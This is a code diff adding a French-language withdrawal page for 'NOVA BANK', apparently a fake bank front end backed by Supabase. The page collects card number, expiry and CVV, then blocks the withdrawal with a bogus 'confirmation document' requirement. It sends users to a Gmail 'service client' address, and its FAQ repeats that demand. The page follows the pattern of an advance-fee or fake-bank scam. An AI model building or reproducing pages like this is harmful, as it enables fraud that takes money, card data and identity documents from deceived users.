@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>NOVA BANK - Retrait</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: #f5f7fc;
+            min-height: 100vh;
+            padding-bottom: 90px;
+        }
+
+        /* Header */
+        .header {
+            background: #0b1a2f;
+            padding: 20px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: white;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: white;
+            letter-spacing: 1px;
+        }
+
+        .logo span {
+            color: #ff5252;
+        }
+
+        .back-btn {
+            background: rgba(255,255,255,0.1);
+            padding: 10px 24px;
+            border-radius: 40px;
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+
+        .back-btn:hover {
+            background: rgba(255,255,255,0.2);
+        }
+
+        /* Container principal */
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 24px 20px;
+        }
+
+        /* Titre de page */
+        .page-title {
+            font-size: 2rem;
+            color: #0b1a2f;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .page-subtitle {
+            color: #6f7d95;
+            margin-bottom: 30px;
+            font-size: 1rem;
+            border-left: 4px solid #ff5252;
+            padding-left: 16px;
+        }
+
+        /* Carte de solde */
+        .balance-info {
+            background: white;
+            border-radius: 40px;
+            padding: 24px;
+            margin-bottom: 30px;
+            border: 1px solid #eef2f6;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .balance-label {
+            color: #6f7d95;
+            font-weight: 600;
+            font-size: 1rem;
+        }
+
+        .balance-value {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #0b1a2f;
+        }
+
+        /* Formulaire */
+        .withdraw-form {
+            background: white;
+            border-radius: 40px;
+            padding: 30px;
+            border: 1px solid #eef2f6;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            color: #0b1a2f;
+            font-weight: 600;
+            font-size: 0.95rem;
+            margin-left: 6px;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 16px 22px;
+            border: 2px solid #e6ecf2;
+            border-radius: 40px;
+            font-size: 1rem;
+            transition: all 0.2s;
+            background: #f9fcff;
+            color: #0b1a2f;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            outline: none;
+            border-color: #0b1a2f;
+            background: white;
+            box-shadow: 0 8px 20px rgba(11,26,47,0.05);
+        }
+
+        .form-group input.error {
+            border-color: #ff5252;
+        }
+
+        .btn-withdraw {
+            width: 100%;
+            padding: 18px;
+            background: #0b1a2f;
+            color: white;
+            border: none;
+            border-radius: 40px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 10px;
+        }
+
+        .btn-withdraw:hover {
+            background: #1e3a5f;
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(11,26,47,0.2);
+        }
+
+        /* Message de sécurité */
+        .security-message {
+            background: #fff8f5;
+            border-left: 4px solid #ff5252;
+            border-radius: 40px;
+            padding: 30px;
+            display: none;
+            animation: fadeIn 0.4s ease;
+        }
+
+        .security-message.show {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .security-message h3 {
+            color: #ff5252;
+            font-size: 1.4rem;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+
+        .security-message p {
+            color: #4f6077;
+            line-height: 1.7;
+            margin-bottom: 20px;
+            font-size: 1rem;
+        }
+
+        .security-box {
+            background: white;
+            border-radius: 30px;
+            padding: 20px;
+            margin: 25px 0;
+            border: 1px solid #ffe4dc;
+        }
+
+        .security-box strong {
+            color: #ff5252;
+            display: block;
+            margin-bottom: 10px;
+            font-size: 1.1rem;
+        }
+
+        .security-box ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .security-box li {
+            padding: 8px 0;
+            color: #4f6077;
+            border-bottom: 1px solid #ffe4dc;
+        }
+
+        .security-box li:last-child {
+            border-bottom: none;
+        }
+
+        .contact-section {
+            text-align: center;
+            margin-top: 25px;
+        }
+
+        .contact-email {
+            background: #ff5252;
+            color: white;
+            border: none;
+            padding: 18px 30px;
+            border-radius: 40px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            width: 100%;
+            margin-bottom: 12px;
+        }
+
+        .contact-email:hover {
+            background: #ff3333;
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(255,82,82,0.3);
+        }
+
+        .email-address {
+            color: #0b1a2f;
+            font-weight: 600;
+            font-size: 1rem;
+            padding: 12px;
+            background: #f0f4ff;
+            border-radius: 40px;
+        }
+
+        /* Alert */
+        .alert {
+            padding: 16px 24px;
+            border-radius: 40px;
+            margin-bottom: 24px;
+            display: none;
+            font-weight: 500;
+        }
+
+        .alert-success {
+            background: #e3f5eb;
+            color: #2d9c5c;
+            border: 1px solid #c0e6d3;
+        }
+
+        .alert-error {
+            background: #ffeae8;
+            color: #ff5252;
+            border: 1px solid #ffcdc8;
+        }
+
+        /* Navigation du bas */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            display: flex;
+            justify-content: space-around;
+            padding: 16px 20px 24px;
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.05);
+            border-top: 1px solid #eef2f6;
+            z-index: 99;
+            backdrop-filter: blur(10px);
+            background: rgba(255,255,255,0.98);
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            color: #8e9daf;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            padding: 8px 20px;
+            border-radius: 40px;
+            text-decoration: none;
+        }
+
+        .nav-item.active {
+            color: #0b1a2f;
+            background: #f0f4ff;
+        }
+
+        .nav-item:hover {
+            color: #0b1a2f;
+        }
+
+        .nav-label {
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .nav-label {
+                display: none;
+            }
+            
+            .nav-item {
+                padding: 10px 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">NOVA<span>BANK</span></div>
+        <a href="dashboard.html" class="back-btn">Retour</a>
+    </header>
+
+    <div class="container">
+        <div class="alert" id="alertMessage"></div>
+
+        <h1 class="page-title">Effectuer un retrait</h1>
+        <div class="page-subtitle">
+            Remplissez le formulaire ci-dessous pour demander un retrait
+        </div>
+
+        <!-- Solde actuel -->
+        <div class="balance-info">
+            <span class="balance-label">Solde disponible</span>
+            <span class="balance-value" id="currentBalance">0.00 €</span>
+        </div>
+
+        <!-- Formulaire de retrait -->
+        <div class="withdraw-form">
+            <form id="withdrawForm">
+                <div class="form-group">
+                    <label>Montant du retrait (EUR)</label>
+                    <input type="number" id="withdrawAmount" placeholder="Ex: 500" min="10" step="10" value="100">
+                </div>
+
+                <div class="form-group">
+                    <label>Compte à débiter</label>
+                    <select id="withdrawAccount">
+                        <option value="current">Compte courant</option>
+                        <option value="savings">Compte épargne</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>Numéro de carte bancaire</label>
+                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
+                </div>
+
+                <div class="form-group">
+                    <label>Date d'expiration</label>
+                    <input type="text" id="cardExpiry" placeholder="MM/AA">
+                </div>
+
+                <div class="form-group">
+                    <label>Cryptogramme (CVV)</label>
+                    <input type="text" id="cardCVV" placeholder="123" maxlength="3">
+                </div>
+
+                <button type="button" class="btn-withdraw" onclick="processWithdraw()">Demander un retrait</button>
+            </form>
+        </div>
+
+        <!-- Message de sécurité (documents requis) -->
+        <div class="security-message" id="securityMessage">
+            <h3>Document de confirmation requis</h3>
+            
+            <p>Pour des raisons de sécurité et conformément à la réglementation bancaire, un document de confirmation est nécessaire pour valider votre retrait.</p>
+            
+            <div class="security-box">
+                <strong>Protocole de sécurité</strong>
+                <ul>
+                    <li>• Document d'identité en cours de validité</li>
+                    <li>• Justificatif de domicile de moins de 3 mois</li>
+                    <li>• Formulaire de retrait signé</li>
+                    <li>• RIB du compte bénéficiaire</li>
+                </ul>
+            </div>
+
+            <p>Veuillez contacter notre service client pour obtenir le document de confirmation personnalisé et les instructions à suivre.</p>
+
+            <div class="contact-section">
+                <button class="contact-email" onclick="contactServiceClient()">
+                    Contacter le service client
+                </button>
+                <div class="email-address">
+                    Serviceclient08987@gmail.com
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Navigation du bas -->
+    <nav class="bottom-nav">
+        <a href="dashboard.html" class="nav-item">
+            <span class="nav-label">Accueil</span>
+        </a>
+        <a href="retrait.html" class="nav-item active">
+            <span class="nav-label">Retrait</span>
+        </a>
+        <a href="#" class="nav-item" onclick="showSupport()">
+            <span class="nav-label">Support</span>
+        </a>
+        <a href="#" class="nav-item" onclick="showFAQ()">
+            <span class="nav-label">FAQ</span>
+        </a>
+        <a href="#" class="nav-item" onclick="logout()">
+            <span class="nav-label">Déconnexion</span>
+        </a>
+    </nav>
+
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+    <script>
+        const SUPABASE_URL = 'https://oypihdbuovijjutuyqaj.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im95cGloZGJ1b3Zpamp1dHV5cWFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzEwMjEwNzIsImV4cCI6MjA4NjU5NzA3Mn0.j3ZXmUYoXtV6rKh7f4_QdrttxSDCTE1khIkV0dHGp4s';
+        
+        const { createClient } = supabase;
+        const _supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        let currentUser = null;
+        let userProfile = null;
+
+        async function checkAuth() {
+            const { data: { user }, error } = await _supabase.auth.getUser();
+            
+            if (error || !user) {
+                window.location.href = 'connexion.html';
+                return;
+            }
+
+            currentUser = user;
+            await loadUserProfile();
+        }
+
+        async function loadUserProfile() {
+            try {
+                const { data, error } = await _supabase
+                    .from('profiles')
+                    .select('*')
+                    .eq('id', currentUser.id)
+                    .single();
+
+                if (error) throw error;
+
+                userProfile = data;
+                document.getElementById('currentBalance').textContent = data.solde.toFixed(2) + ' €';
+                
+            } catch (error) {
+                console.error('Erreur chargement profil:', error);
+            }
+        }
+
+        function showAlert(message, type) {
+            const alert = document.getElementById('alertMessage');
+            alert.textContent = message;
+            alert.className = `alert alert-${type}`;
+            alert.style.display = 'block';
+            
+            setTimeout(() => {
+                alert.style.display = 'none';
+            }, 5000);
+        }
+
+        function processWithdraw() {
+            const amount = document.getElementById('withdrawAmount').value;
+            const account = document.getElementById('withdrawAccount').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const cardExpiry = document.getElementById('cardExpiry').value;
+            const cardCVV = document.getElementById('cardCVV').value;
+
+            // Vérifications
+            if (!amount || amount < 10) {
+                showAlert('Le montant minimum est de 10€', 'error');
+                return;
+            }
+
+            if (!cardNumber || !cardExpiry || !cardCVV) {
+                showAlert('Veuillez remplir les informations de carte', 'error');
+                return;
+            }
+
+            if (amount > userProfile.solde) {
+                showAlert('Solde insuffisant pour ce retrait', 'error');
+                return;
+            }
+
+            // Afficher le message de sécurité
+            document.getElementById('securityMessage').classList.add('show');
+            
+            // Faire défiler jusqu'au message
+            document.getElementById('securityMessage').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function contactServiceClient() {
+            const email = 'Serviceclient08987@gmail.com';
+            const sujet = encodeURIComponent('Demande de document de confirmation de retrait');
+            
+            const message = encodeURIComponent(
+                `Bonjour,\n\n` +
+                `Je souhaite effectuer un retrait sur mon compte NOVA BANK et j'ai besoin du document de confirmation de sécurité.\n\n` +
+                `Informations :\n` +
+                `- Nom : ${userProfile ? userProfile.nom : 'Non disponible'}\n` +
+                `- Email : ${currentUser ? currentUser.email : 'Non disponible'}\n` +
+                `- Montant demandé : ${document.getElementById('withdrawAmount').value} €\n\n` +
+                `Merci de me faire parvenir le document nécessaire.\n\n` +
+                `Cordialement.`
+            );
+            
+            window.location.href = `mailto:${email}?subject=${sujet}&body=${message}`;
+            showAlert('Redirection vers votre client mail', 'success');
+        }
+
+        function showSupport() {
+            showAlert('Support client : 01 23 45 67 89 - serviceclient@novabank.fr', 'success');
+        }
+
+        function showFAQ() {
+            showAlert('FAQ : Les retraits nécessitent un document de confirmation pour des raisons de sécurité. Contactez le service client pour l\'obtenir.', 'success');
+        }
+
+        async function logout() {
+            try {
+                const { error } = await _supabase.auth.signOut();
+                if (error) throw error;
+                window.location.href = 'connexion.html';
+            } catch (error) {
+                console.error('Erreur déconnexion:', error);
+                showAlert('Erreur lors de la déconnexion', 'error');
+            }
+        }
+
+        checkAuth();
+    </script>
+</body>
+</html>
